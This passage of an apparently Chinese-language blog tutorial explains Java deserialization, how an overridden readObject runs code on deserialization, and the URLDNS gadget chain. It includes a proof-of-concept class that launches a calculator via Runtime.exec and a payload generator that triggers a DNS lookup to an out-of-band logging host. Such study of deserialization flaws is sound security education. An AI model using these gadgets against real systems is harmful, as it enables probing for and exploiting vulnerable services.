+<li>接口 ObjectInput：ObjectInput 扩展了 DataInput 接口，DataInput 接口提供了从二进制流读取字节并将其重新转换为 Java 基础类型的功能，ObjectInput 额外提供了 <code>readObject</code> 方法用来读取类。</li>
+<li>接口 ObjectStreamConstants：同上。</li>
+</ul>
+<p>ObjectInputStream 实现了反序列化功能，看一下其中的关键方法。</p>
+<h4 id="readobject">readObject<a hidden class="anchor" aria-hidden="true" href="#readobject">#</a></h4>
+<p>从 ObjectInputStream 读取一个对象，将会读取对象的类、类的签名、类的非 transient 和非 static 字段的值，以及其所有父类类型。</p>
+<p>我们可以使用 <code>writeObject</code> 和 <code>readObject</code> 方法为一个类重写默认的反序列化执行方，所以其中 <code>readObject</code> 方法会 “传递性” 的执行，也就是说，在反序列化过程中，会调用反序列化类的 <code>readObject</code> 方法，以完整的重新生成这个类的对象。</p>
+<h4 id="readunshared">readUnshared<a hidden class="anchor" aria-hidden="true" href="#readunshared">#</a></h4>
+<p>从 ObjectInputStream 读取一个非共享对象。 此方法与 <code>readObject</code> 类似，不同点在于<code>readUnshared</code> 不允许后续的 <code>readObject</code> 和 <code>readUnshared</code> 调用引用这次调用反序列化得到的对象。</p>
+<h4 id="readobject0">readObject0<a hidden class="anchor" aria-hidden="true" href="#readobject0">#</a></h4>
+<p><code>readObject</code> 和 <code>readUnshared</code> 实际上调用 <code>readObject0</code> 方法，<code>readObject0</code>是上面两个方法的基础实现。</p>
+<h4 id="readobjectoverride">readObjectOverride<a hidden class="anchor" aria-hidden="true" href="#readobjectoverride">#</a></h4>
+<p>由 ObjectInputStream 子类调用，与 writeObjectOverride 一致。</p>
+<p>通过上面对 ObjectOutputStream 和 ObjectInputStream 的了解，两个类的实现几乎是一种对称的、双生的方式进行。</p>
+<h2 id="反序列化漏洞">反序列化漏洞<a hidden class="anchor" aria-hidden="true" href="#反序列化漏洞">#</a></h2>
+<p>在前面提到过，一个类想要实现序列化和反序列化，必须要实现 <code>java.io.Serializable</code> 或 <code>java.io.Externalizable</code> 接口。</p>
+<p>Serializable 接口是一个标记接口，标记了这个类可以被序列化和反序列化，而 Externalizable 接口在 Serializable 接口基础上，又提供了 <code>writeExternal</code> 和 <code>readExternal</code> 方法，用来序列化和反序列化一些外部元素。</p>
+<p>其中，如果被序列化的类重写了 writeObject 和 readObject 方法，Java 将会委托使用这两个方法来进行序列化和反序列化的操作。</p>
+<p>正是因为这个特性，导致反序列化漏洞的出现：在反序列化一个类时，如果其重写了 <code>readObject</code> 方法，程序将会调用它，如果这个方法中存在一些恶意的调用，则会对应用程序造成危害。</p>
+<p>这里，我们以一个<code>demo</code>程序为例子，编写了<code>Person</code>类，继承了<code>Serializable</code>接口，并且在<code>readObject</code>方法中重写了恶意代码，使其能够弹出计算器框。</p>
+<p>然后我们将这个类序列化并写在文件中，随后对其进行反序列化，就触发了命令执行。</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> Basic;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.*;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName Person
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2022/10/23 15:15
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> Person <span style="color:#fff;font-weight:bold">implements</span> Serializable {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> String name;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">int</span> age;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> Person(String name, <span style="color:#fff;font-weight:bold">int</span> age) <span style="color:#fff;font-weight:bold">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">name</span> = name;
+</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">age</span> = age;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">private</span> <span style="color:#fff;font-weight:bold">void</span> readObject(java.<span style="color:#007f7f">io</span>.<span style="color:#007f7f">ObjectInputStream</span> in) <span style="color:#fff;font-weight:bold">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(<span style="color:#0ff;font-weight:bold">&#34;open -a Calculator.app&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  	
+</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>        Person person = <span style="color:#fff;font-weight:bold">new</span> Person(<span style="color:#0ff;font-weight:bold">&#34;reus09&#34;</span>, <span style="color:#ff0;font-weight:bold">21</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos = <span style="color:#fff;font-weight:bold">new</span> ObjectOutputStream(<span style="color:#fff;font-weight:bold">new</span> FileOutputStream(<span style="color:#0ff;font-weight:bold">&#34;abc.txt&#34;</span>));
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#007f7f">writeObject</span>(person);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#007f7f">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        FileInputStream   fis = <span style="color:#fff;font-weight:bold">new</span> FileInputStream(<span style="color:#0ff;font-weight:bold">&#34;abc.txt&#34;</span>);
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois = <span style="color:#fff;font-weight:bold">new</span> ObjectInputStream(fis);
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#007f7f">readObject</span>();
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#007f7f">close</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024162723342.png" alt="image-20221024162723342"  />
+</p>
+<h3 id="readobject的具体流程"><code>readObject</code>的具体流程<a hidden class="anchor" aria-hidden="true" href="#readobject的具体流程">#</a></h3>
+<p>为什么<code>readObject</code>会触发反序列化呢，我们具体走一下流程，看一下具体每个步骤的代码。</p>
+<p>首先，在<code>readObject</code>方法中调用了<code>readObject0</code>方法反序列化字符串。</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024163701354.png" alt="image-20221024163701354"  />
+</p>
+<p>然后<code>readObject0</code>是以字节的方式去读数据，如果读取到<code>0x73</code>，则代表这是一个对象的序列化数据，将会调用 <code>readOrdinaryObject</code> 方法进行处理</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024164025314.png" alt="image-20221024164025314"  />
+</p>
+<p>然后在<code>readOrdinaryObject</code>方法中，先调用<code>readClassDesc</code>读取类描述符，并根据其中的内容进行一些条件判断，比如是否是<code>String</code>,<code>Class</code>,<code>ObjectStreamClass</code>的类，然后判断其继承的是否是<code>Externalizable</code>接口，如果是就执行<code>readExternalData</code>方法，否则就执行<code>readSerialData</code>方法。</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024164304672.png" alt="image-20221024164304672"  />
+</p>
+<p>在<code>readSerialData</code>方法中，通过类描述符的<code>getClassDataLayout</code>方法获得了序列化对象的数据布局，通过布局的 <code>hasReadObjectMethod</code> 方法判断对象是否有重写 <code>readObject</code> 方法，如果有，则使用 <code>invokeReadObject</code> 方法调用对象中的 <code>readObject</code> 。</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024164820798.png" alt="image-20221024164820798"  />
+</p>
+<p>最后在<code>invokeReadObject</code>方法中经过一系列初始化的调用，最后执行我们反序列化后的对象的<code>readObject</code>方法。</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024165137496.png" alt="image-20221024165137496"  />
+</p>
+<p>通过上述分析，我们就了解了反序列化漏洞的触发原因。与反序列漏洞的触发方式相同，在序列化时，如果一个类重写了 <code>writeObject</code> 方法，并且其中产生恶意调用，则将会导致漏洞，当然在实际环境中，序列化的数据来自不可信源的情况比较少见。</p>
+<h2 id="urldns">URLDNS<a hidden class="anchor" aria-hidden="true" href="#urldns">#</a></h2>
+<p>根据<code>su18</code>师傅所描述，一个能成功执行的反序列化调用链需要三个元素：<code>“kick-off”</code>、<code>“sink”</code>、<code>“chain”</code>。翻译成中文来说就是 “入口点（重写了 readObject 的类）”、“sink 点（最终执行恶意动作的点：RCE）”、“chain （中间的调用链）”。</p>
+<p>URLDNS 是适合新手分析的反序列化链，只依赖原生类，没有 jdk 版本限制，也被 ysoserial 涵盖在其中。它不会执行命令，只会触发 DNS 解析，因此通常用来探测是否存在反序列化漏洞。</p>
+<p>这个漏洞关键点是 Java 内置的 <code>java.net.URL</code> 类，这个类的 <code>equals</code> 和 <code>hashCode</code> 方法具有一个有趣的特性：在对 URL 对象进行比较时（使用 <code>equals</code> 方法或 <code>hashCode</code> 方法），会触发一次 DNS 解析，因为对于 URL 来说，如果两个主机名（host）都可以解析为相同的 IP 地址，则这两个主机会被认为是相同的。</p>
+<p>下面我们着重分析一下<code>equals</code>方法和<code>hashCode</code>方法，学习一下为什么它能够触发<code>DNS</code>解析。</p>
+<h3 id="urlequals"><code>URL.equals</code><a hidden class="anchor" aria-hidden="true" href="#urlequals">#</a></h3>
+<p>首先在<code>URL#equals</code>方法重写了对<code>Object</code>的判断，如果<code>obj</code>不是<code>URL</code>类，直接返回<code>false</code>，然后调用<code>java.net.URLStreamHandler#equals</code>进行判断。</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024170036885.png" alt="image-20221024170036885"  />
+</p>
+<p><code>URLStreamHandler#equals</code> 方法判断 URL 对象的锚点是否相同，并调用 <code>sameFile</code> 方法比较两个 URL，看它们是否引用了相同的 <code>protocol</code>(协议)、<code>host</code>(主机)、<code>port</code>(端口)、<code>path</code>(路径)。</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024170418397.png" alt="image-20221024170418397"  />
+</p>
+<p><code>sameFile</code>同时还调用了<code>hostsEquals</code>来查看其<code>host</code>主机是否相同。</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024170454013.png" alt="image-20221024170454013"  />
+</p>
+<p>在<code>hostEqual</code>方法中，调用了<code>getHostAddress</code>方法来获取主机的地址。</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024170559651.png" alt="image-20221024170559651"  />
+</p>
+<p>在<code>getHostAddress</code>方法中通过<code>getByName</code>相当于将传入的<code>host</code>进行<code>dns解析</code>，获取<code>IP</code>,从而实现了触发<code>DNS解析</code></p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024170650792.png" alt="image-20221024170650792"  />
+</p>
+<h3 id="urlhashcode"><code>URL.hashcode</code><a hidden class="anchor" aria-hidden="true" href="#urlhashcode">#</a></h3>
+<p>此方法将一个对象映射为一个整型的值，通常与 <code>equals</code> 方法同时出现。</p>
+<p>当 <code>equals</code> 方法被重写时，<code>hashCode</code> 也需要被重写。按照一般 <code>hashCode</code> 方法的实现来说，如果两个对象通过 <code>equals</code> 方法判断相同，那它们的 hash code 一定相等。</p>
+<p>URL 的 <code>hashCode</code> 方法也进行了重写，调用了 <code>URLStreamHandler#hashCode</code> 方法。在此之前有一个判断，那就是 <code>hashCode != -1</code>，</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024170833744.png" alt="image-20221024170833744"  />
+</p>
+<p>同样在<code>URLStreamHandler#hashCode</code>方法中，调用了<code>getHostAddress</code>方法来实现<code>DNS解析</code>。</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024170947765.png" alt="image-20221024170947765"  />
+</p>
+<h3 id="kick-offhashmap"><code>Kick-off</code>:<code>HashMap</code><a hidden class="anchor" aria-hidden="true" href="#kick-offhashmap">#</a></h3>
+<p>上面关于<code>URL</code>触发<code>DNS</code>解析的<code>equal</code>,<code>hashcode</code>方法实际上就是这条反序列化链的<code>sink</code>,那么我们怎么建立一个<code>kick-off</code>来作为这条链的入口，就牵扯到主角<code>java.util.HashMap</code>,同样继承了<code>Serializable</code>接口。</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024171731876.png" alt="image-20221024171731876"  />
+</p>
+<p>那么我们就看一下<code>HashMap</code>是如何在<code>readObject</code>方法中存在我们的<code>kick-off</code>点.</p>
+<p>省略掉前面各种初始化的代码，将序列化对象中的键值进行 for 循环，并调用里面的 key 和 value 对象的 <code>readObject</code> 方法反序列化 key 和 value 的值后，使用 <code>putVal</code> (1.7 是 <code>putForCreate</code> 方法) 将这些键、值以及相关的 hash 等信息写入 HashMap 的属性 table 中。</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024171957555.png" alt="image-20221024171957555"  />
+</p>
+<p>HashMap 通过一个静态方法 <code>hash</code> 计算 key 对象的 hash 值，如果 key 为 null， 则值为 0 ，否则将调用 key 的 hashCode 方法计算 hashCode 值，再和位移 16 位的结果进行异或得出 hash 值。</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024172051658.png" alt="image-20221024172051658"  />
+</p>
+<p>也就是说，在反序列化一个 <code>HashMap</code> 时，会调用其中的 key 对象的 <code>hashCode </code>方法计算<code> hash</code> 值。如果反序列化一个 HashMap 对象中的 key 是<code>URL</code>对象，在反序列化时就会调用这个 URL 对象的 <code>hashCode</code> 方法，触发 DNS 解析查询。这个逻辑就是 URLDNS 这条反序列化利用的 gadget 的基本原理。</p>
+<h3 id="注意点">注意点<a hidden class="anchor" aria-hidden="true" href="#注意点">#</a></h3>
+<p>1、在使用 HashMap 的 <code>put</code> 方法时，也是调用 <code>putVal</code> 方法，会对 key 进行 hash，触发解析。如果我们不想在生成 payload 时触发 DNS 解析，就要使用反射将值放进去。</p>
+<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20221024172313301.png" alt="image-20221024172313301"  />
+</p>
+<p>2、在 URL 对象有一个属性 hashCode，默认是<code> -1</code>，使用<code>hashCode</code> 方法计算时会在 hashCode 属性中缓存已经计算过的值，如果再次计算将直接返回值，不会在触发 URLStreamHandler 的 <code>hashCode</code> 方法，也就不会触发漏洞。所以我们需要在生成的 HashMap 中的 URL 参数的 hashCode 值在反序列化时为 -1，而刚才说过，如果使用 put 方法，会调用一次 key 的 hash 计算，也就是 URL 的 <code>hashCode</code> 方法，这样就把 hashCode 缓存了，在反序列化时就不会触发 URLStreamHandler 的 <code>hashCode</code> 方法以及后面的逻辑。</p>
+<p>所以有两种思路解决这个问题：</p>
+<ul>
+<li>直接反射调用 <code>HashMap </code>的 <code>putVal</code> 方法绕过 hash 计算。（由于 JDK 1.7 中方法名不一样，细节也不一样，所以不具有通用性）</li>
+<li>使用<code>HashMap</code>的<code>put</code>方法，将<code>URL</code>对象放到<code>HashMap</code>的<code>Key</code>之前，先对其<code>hashcode</code>进行修改，使其不为<code>-1</code>,放入<code>HashMap</code>之后，通过反射将<code>hashcode</code>修改为<code>-1</code>。</li>
+</ul>
+<p>第一种思路的代码实现：</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> URLDNS {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> main(String[] args) <span style="color:#fff;font-weight:bold">throws</span> Exception {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		HashMap&lt;URL, Integer&gt; hashMap = <span style="color:#fff;font-weight:bold">new</span> HashMap&lt;&gt;();
+</span></span><span style="display:flex;"><span>		URL                   url     = <span style="color:#fff;font-weight:bold">new</span> URL(<span style="color:#0ff;font-weight:bold">&#34;http://reus09.zmz0xr.ceye.io&#34;</span>);
+</span></span><span style="display:flex;"><span>		Field                 f       = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;java.net.URL&#34;</span>).<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;hashCode&#34;</span>);
+</span></span><span style="display:flex;"><span>		f.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		f.<span style="color:#007f7f">set</span>(url, <span style="color:#ff0;font-weight:bold">0x01010101</span>);
+</span></span><span style="display:flex;"><span>		hashMap.<span style="color:#007f7f">put</span>(url, <span style="color:#ff0;font-weight:bold">0</span>);
+</span></span><span style="display:flex;"><span>		f.<span style="color:#007f7f">set</span>(url, -<span style="color:#ff0;font-weight:bold">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		ObjectOutputStream oos = <span style="color:#fff;font-weight:bold">new</span> ObjectOutputStream(<span style="color:#fff;font-weight:bold">new</span> FileOutputStream(<span style="color:#0ff;font-weight:bold">&#34;urldns.bin&#34;</span>));
+</span></span><span style="display:flex;"><span>		oos.<span style="color:#007f7f">writeObject</span>(hashMap);
+</span></span><span style="display:flex;"><span>		ObjectInputStream ois = <span style="color:#fff;font-weight:bold">new</span> ObjectInputStream(<span style="color:#fff;font-weight:bold">new</span> FileInputStream(<span style="color:#0ff;font-weight:bold">&#34;urldns.bin&#34;</span>));
+</span></span><span style="display:flex;"><span>		ois.<span style="color:#007f7f">readObject</span>();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>第二种思路的代码实现：</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
